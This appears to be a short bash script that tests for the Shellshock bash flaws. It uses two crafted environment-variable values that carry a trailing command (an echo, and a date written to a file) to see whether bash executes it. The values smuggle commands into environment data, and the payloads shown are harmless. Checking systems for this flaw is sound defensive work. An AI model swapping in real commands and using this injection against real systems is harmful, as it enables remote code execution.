#!/bin/bash

env x='() { :;}; echo vulnerable' bash -c 'echo hello'

env X='() { (a)=>\' sh -c "echo date"; cat echo
